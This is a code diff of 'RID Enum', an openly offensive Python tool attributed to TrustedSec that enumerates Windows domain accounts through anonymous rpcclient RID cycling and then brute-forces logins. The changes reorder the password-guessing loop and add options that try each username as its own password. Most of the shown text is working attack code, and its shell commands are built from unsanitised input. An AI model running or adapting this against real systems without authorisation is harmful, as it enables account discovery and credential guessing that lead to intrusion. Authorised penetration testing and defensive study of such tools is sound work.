@@ -4,7 +4,7 @@ import os
 import sys
 #############################################################################################################
 #
-# RID Enum v0.2
+# RID Enum
 # RID Cycling Tool 
 #
 # Written by: David Kennedy (ReL1K)
@@ -43,10 +43,17 @@ def sid_to_name(ip, sid, rid):
 	proc = subprocess.Popen('rpcclient -U "" %s -N -c "lookupsids %s-%s"' % (ip, sid,rid), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
 	stdout_value = proc.communicate()[0]
 	if not "*unknown*" in stdout_value:
-		stdout_value = stdout_value.split(" ")
+		rid_account = stdout_value.split(" ", 1)[1]
 		# will show during an unhandled request
-		if stdout_value[1] != "request":
-			return stdout_value[1]
+		if rid_account[1] != "request":
+			# here we join based on spaces, for example 'Domain Admins' needs to be joined
+			rid_account = rid_account.replace("(1)", "")
+			rid_account = rid_account.replace("(2)", "")
+			rid_account = rid_account.replace("(3)", "")
+			rid_account = rid_account.replace("(4)", "")
+			# return the full domain\username
+			rid_account = rid_account.rstrip()
+			return rid_account
 
 # capture initial input
 success = ""
@@ -155,17 +162,21 @@ try:
 		# our list of users
 		userfile = file("%s_users.txt" % (ip), "r").readlines()
 
-		# cycle through a password list
-		for password in passfile:
-			# strip unused characters
-			password = password.rstrip()
-			for user in userfile:
-				# strip unused characters
-				user = user.rstrip()
-				# insert additional backslash for rpcclient compliance
-				user_fixed = user.replace("\\", "\\\\")
-				# brute force, single quotes in names mess things up
-				if not "'" in user:
+		# cycle through username first
+		for user in userfile:
+			user = user.rstrip()
+			user_fixed = user.replace("\\", "\\\\")
+			if not "'" in user:
+				for password in passfile:
+					password = password.rstrip()
+					# if we specify a lowercase username
+					if password == "lc username":
+						password = user.split("\\")[1] 
+						password = password.lower()
+					# if we specify a uppercase username
+					if password == "uc username": 
+						password = user.split("\\")[1]
+						password = password.upper()
 					child = pexpect.spawn("rpcclient -U '%s%%%s' %s" % (user_fixed, password, ip))
 					i = child.expect(['LOGON_FAILURE', 'rpcclient'])
 					if i == 0:
@@ -207,7 +218,6 @@ except IndexError, e:
                             |______|                                       
 
 Written by: David Kennedy (ReL1K)
-Version: 0.2
 Company: https://www.trustedsec.com
 Twitter: @TrustedSec
 Twitter: @Dave_ReL1K
